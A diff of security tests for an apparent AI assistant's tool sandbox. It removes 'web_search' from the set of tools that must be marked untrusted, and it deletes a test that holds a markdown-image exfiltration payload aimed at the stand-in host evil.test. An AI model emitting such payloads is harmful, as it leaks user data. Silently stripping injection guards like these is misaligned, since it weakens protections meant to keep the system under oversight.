@@ -97,7 +97,7 @@ def test_model_has_no_tool_that_can_approve_or_reject_anything(make_container, t
 def test_every_external_data_tool_is_fenced_and_gated(make_container, tmp_path):
     """Guard against someone adding a new reader tool and forgetting the untrusted flag."""
     world = build_world(make_container, tmp_path, "x")
-    external = {"web_fetch", "web_search", "github_list_repos", "github_get_readme", "github_list_issues", "github_recent_commits", "notes_search", "read_note", "note_outline", "extract_from_note", "compare_notes", "read_calendar", "github_list_pulls",
+    external = {"web_fetch", "github_list_repos", "github_get_readme", "github_list_issues", "github_recent_commits", "notes_search", "read_note", "note_outline", "extract_from_note", "compare_notes", "read_calendar", "github_list_pulls",
                 "gmail_search", "gmail_read", "gmail_triage", "gmail_extract", "gcal_list_events"}
     reg = {t.name: t for t in world.executor.registry.all()}
     assert external <= set(reg)
@@ -164,15 +164,6 @@ def test_dashboard_never_renders_model_output_as_html_or_markdown():
         assert dangerous not in code, dangerous
     pkg = (Path(__file__).resolve().parents[2] / "frontend" / "package.json").read_text()
     assert not re.search(r"markdown|marked|remark|rehype|dompurify|showdown", pkg, re.IGNORECASE)
-
-
-def test_telegram_messages_are_plain_text_not_html_or_markdown():
-    import httpx
-    from app.integrations.notifier import TelegramNotifier
-    sent = []
-    client = httpx.Client(transport=httpx.MockTransport(lambda r: sent.append(r.content) or httpx.Response(200, json={"ok": True, "result": {}})))
-    TelegramNotifier("t", "1", client).send("![x](https://evil.test/p?d=1) <a href='https://evil.test'>click</a>")
-    assert b"parse_mode" not in sent[0]  # without parse_mode Telegram shows it literally and does not fetch images
 
 
 def test_system_prompt_instructs_model_to_treat_external_text_as_data(make_container, tmp_path):
